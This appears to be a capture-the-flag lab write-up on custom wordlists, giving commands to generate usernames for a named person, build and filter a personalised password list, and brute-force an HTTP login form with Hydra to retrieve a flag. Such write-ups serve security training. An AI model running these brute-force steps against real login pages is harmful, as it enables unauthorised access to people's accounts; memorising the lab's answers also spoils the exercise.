# Custom Wordlists

### After successfully brute-forcing, and then logging into the target, what is the full flag you find?

Getting the flag:

**Step 1** - Generate usernames:

* {% code overflow="wrap" %}
  ```bash
  ./username-anarchy Jane Smith > jane_smith_usernames.txt
  ```
  {% endcode %}

**Step 2** - Use CUPP to create a personolyzed passoword list:

*

    <figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

**Step 3** - Filter the password to match the following policy:

* Minimum Length: 6 characters
* Must Include:
  * At least one uppercase letter
  * At least one lowercase letter
  * At least one number
  * At least two special characters (from the set `!@#$%^&*`)
*   {% code overflow="wrap" %}
    ```bash
    grep -E '^.{6,}$' jane.txt | grep -E '[A-Z]' | grep -E '[a-z]' | grep -E '[0-9]' | grep -E '([!@#$%^&*].*){2,}' > jane-filtered.txt
    ```
    {% endcode %}



**Step 4** - Brute-force the login form with Hydra:

* {% code overflow="wrap" %}
  ```bash
  hydra -L jane_smith_usernames.txt -P jane-filtered.txt SERVER_IP -s SERVERPORT -f http-post-form "/:username=^USER^&password=^PASS^:Invalid credentials"
  ```
  {% endcode %}
*

    <figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>

**Step 5** - Login with the credentials and get the flag:

<figure><img src="../../../.gitbook/assets/image (182).png" alt=""><figcaption></figcaption></figure>
